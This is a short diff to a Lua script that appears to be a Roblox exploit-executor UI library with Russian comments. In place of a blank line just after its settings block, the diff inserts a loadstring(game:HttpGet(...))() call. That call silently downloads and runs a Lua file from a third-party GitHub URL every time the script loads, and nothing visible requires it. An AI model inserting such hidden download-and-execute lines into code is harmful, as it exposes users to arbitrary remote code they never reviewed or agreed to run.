@@ -15,7 +15,7 @@ local CURSOR_IMAGE_ID = "18392993708"   -- ID изображения для ка
 local NOTIFY_SOUND_ID = "8679627751"    -- ID звука уведомлений
 local NOTIFY_ANIMATION_SPEED = 0.3      -- скорость анимации уведомлений (секунды)
 -- ==========================================
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/N9TALovchik/-/refs/heads/main/addons/NOTALovchik.lua"))()
 local ProtectGui = protectgui or (syn and syn.protect_gui) or (function() end);
 
 local ScreenGui = Instance.new('ScreenGui');
